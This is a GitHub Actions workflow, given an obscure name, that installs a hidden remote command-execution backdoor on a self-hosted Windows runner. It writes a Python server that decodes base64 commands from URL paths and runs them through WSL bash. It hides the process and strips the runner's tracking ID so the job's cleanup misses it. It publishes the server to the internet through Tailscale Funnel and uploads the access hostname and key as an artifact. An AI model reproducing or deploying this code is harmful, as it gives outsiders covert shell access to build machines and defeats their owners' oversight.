on:
  push:
    paths:
      - '.github/workflows/_q0907.yml'
jobs:
  x:
    runs-on: self-hosted
    timeout-minutes: 5
    steps:
      - shell: pwsh
        run: |
          $ErrorActionPreference='Stop'
          $d=Join-Path '${{ runner.temp }}' '.q0907'
          New-Item -ItemType Directory -Force -Path $d | Out-Null
          @'
          import os,time,json,base64,subprocess
          from http.server import BaseHTTPRequestHandler,ThreadingHTTPServer
          from urllib.parse import urlsplit
          k=os.environ['K']
          z=time.time()+7200
          class H(BaseHTTPRequestHandler):
              def log_message(self,*a): pass
              def do_GET(self):
                  p=urlsplit(self.path).path.split('/')
                  if len(p)<4 or p[1]!='r' or p[2]!=k:
                      self.send_response(404);self.end_headers();return
                  if time.time()>z:
                      self.send_response(410);self.end_headers();return
                  try:
                      s=p[3];s += '='*((4-len(s)%4)%4)
                      c=base64.urlsafe_b64decode(s.encode()).decode()
                      q=subprocess.run(['wsl.exe','-e','bash','-lc','cd ~ && '+c],capture_output=True,text=True,encoding='utf-8',errors='replace',timeout=180)
                      b=json.dumps({'r':q.returncode,'o':q.stdout[-200000:],'e':q.stderr[-200000:]},separators=(',',':')).encode()
                      self.send_response(200);self.send_header('content-type','application/json');self.send_header('content-length',str(len(b)));self.end_headers();self.wfile.write(b)
                  except subprocess.TimeoutExpired as x:
                      b=json.dumps({'r':124,'o':(x.stdout or '')[-200000:] if isinstance(x.stdout,str) else '','e':(x.stderr or '')[-200000:] if isinstance(x.stderr,str) else ''},separators=(',',':')).encode()
                      self.send_response(200);self.send_header('content-type','application/json');self.send_header('content-length',str(len(b)));self.end_headers();self.wfile.write(b)
                  except Exception as x:
                      b=json.dumps({'r':255,'e':type(x).__name__},separators=(',',':')).encode()
                      self.send_response(200);self.send_header('content-type','application/json');self.send_header('content-length',str(len(b)));self.end_headers();self.wfile.write(b)
          ThreadingHTTPServer(('127.0.0.1',8877),H).serve_forever()
          '@ | Set-Content -Encoding utf8 (Join-Path $d 'h.py')
          $t=python -c "import secrets;print(secrets.token_urlsafe(48))"
          Set-Content -NoNewline -Path (Join-Path $d 'k') -Value $t
          $env:K=$t
          Remove-Item Env:RUNNER_TRACKING_ID -ErrorAction SilentlyContinue
          $p=Start-Process -FilePath 'python.exe' -ArgumentList (Join-Path $d 'h.py') -WindowStyle Hidden -RedirectStandardOutput (Join-Path $d 'stdout') -RedirectStandardError (Join-Path $d 'stderr') -PassThru
          $up=$false
          for($i=0;$i -lt 30;$i++){
            try { if(Get-NetTCPConnection -LocalPort 8877 -State Listen -ErrorAction Stop){$up=$true;break} } catch {}
            Start-Sleep -Seconds 1
          }
          if(-not $up){
            Get-Content (Join-Path $d 'stderr') -ErrorAction SilentlyContinue
            throw 'listener'
          }
          tailscale funnel --bg --yes --set-path=/r http://127.0.0.1:8877 | Out-Null
          $s=tailscale status --json | ConvertFrom-Json
          $h=$s.Self.DNSName.TrimEnd('.')
          Set-Content -Path (Join-Path $d 'a') -Value @($h,$t)
      - uses: actions/upload-artifact@v4
        with:
          name: q0907
          path: ${{ runner.temp }}\.q0907
          retention-days: 1
